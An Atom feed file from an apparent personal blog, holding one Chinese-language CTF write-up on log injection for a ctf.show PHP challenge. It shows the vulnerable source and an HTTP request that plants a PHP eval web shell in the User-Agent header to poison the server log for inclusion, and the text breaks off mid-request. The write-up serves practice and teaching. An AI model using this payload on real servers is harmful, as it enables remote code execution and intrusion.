@@ -1,0 +1,780 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://m3k0mi.github.io</id>
+    <title>M3k0mi&#39;s blog</title>
+    <subtitle></subtitle>
+    <icon>http://m3k0mi.github.io/assets/favicon.ico</icon>
+    <link href="http://m3k0mi.github.io" />
+    <author>
+      <name>M3k0mi</name>
+    </author>
+    <updated>2024-06-05T10:31:46.000Z</updated>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/06/05/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-web150/</id>
+        <title>日志注入-web150</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/06/05/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-web150/"/>
+        <content type="html">&lt;h3 id=&#34;源码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码&#34;&gt;#&lt;/a&gt; 源码&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# -*- coding: utf-8 -*-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Author: h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Date:   2020-10-13 11:25:09&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified by:   h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified time: 2020-10-19 07:12:57&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;flag.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;CTFSHOW&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$vip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$secret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;vip&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;secret&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$flag&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;isVIP&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;vip&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__autoload&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#过滤字符&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;QUERY_STRING&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/\_| |\[|\]|\?/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ctf&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;ctf&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;extract&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;class_exists&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__CTFSHOW__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;class is exists!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$isVIP&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;strrpos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ctf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ctf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这题的一个非预期解就是日志注入&lt;/p&gt;
+&lt;h3 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h3&gt;
+&lt;p&gt;抓包&lt;/p&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/?isVIP=1&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;0f219ad0-725a-48fd-9470-ade9494134c0.challenge.ctf.show&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0 &amp;lt;?php @eval($_POST[&#39;1&#39;]);?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate, br&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;document&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;navigate&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;none&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-Fetch-User&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;?1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Priority&lt;/span&gt;&lt;span class=&#34;token 